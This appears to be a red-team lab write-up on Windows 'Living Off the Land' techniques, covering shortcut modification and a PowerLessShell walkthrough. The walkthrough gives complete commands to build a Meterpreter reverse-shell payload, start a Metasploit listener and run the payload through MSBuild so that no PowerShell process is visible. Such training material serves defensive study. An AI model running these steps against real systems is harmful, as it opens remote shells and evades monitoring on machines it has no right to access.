## Living Off the Land: Other Techniques

This section highlights interesting techniques used for initial access or persistence. These methods fall under the "Living Off the Land" umbrella, as they leverage built-in Windows utilities.

---

### Shortcuts

Shortcuts (or symbolic links) refer to files or applications within the OS. When a user clicks a shortcut, the referenced file or app is executed. Red Teams often use shortcut modification for initial access, privilege escalation, or persistence.

**MITRE ATT&CK Reference:**  
- [T1547: Shortcut Modification](https://attack.mitre.org/techniques/T1547/)

**Common targets for shortcut modification:**
- `rundll32.exe`
- `powershell.exe`
- `regsvr32.exe`
- Any executable on disk

**Example:**  
An attacker modifies an Excel shortcut to execute `calc.exe` via `rundll32.exe`. When the victim clicks the Excel icon, Calculator launches instead.

For more details, see [this GitHub repo](https://github.com/your-repo-link).

---

### No PowerShell!

In 2019, Red Canary reported PowerShell as the most-used technique for malicious activity. Organizations now monitor or block `powershell.exe`, so adversaries seek alternatives to run PowerShell code without spawning the process.

#### PowerLessShell

[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell) is a Python tool that generates code to run on a target without showing a PowerShell process. It abuses the Microsoft Build Engine (MSBuild) to execute remote code.

**Steps:**

1. **Clone PowerLessShell:**
    ```bash
    git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
    ```

2. **Generate a PowerShell payload with msfvenom:**
    ```bash
    msfvenom -p windows/meterpreter/reverse_winhttps LHOST=<AttackBox_IP> LPORT=4443 -f psh-reflection > liv0ff.ps1
    ```

3. **Start Metasploit listener:**
    ```bash
    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost <AttackBox_IP>; set lport 4443; exploit"
    ```

4. **Convert payload for MSBuild:**
    ```bash
    cd PowerLessShell
    python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj
    ```

5. **Transfer `liv0ff.csproj` to the target Windows machine.**  
   (Use SCP or host with `python3 -m http.server 1337` and download via browser.)

6. **Execute with MSBuild on the target:**
    ```cmd
    C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\thm\Desktop\liv0ff.csproj
    ```

After running MSBuild, wait a few seconds for the reverse shell. No `powershell.exe` process will be visible.

---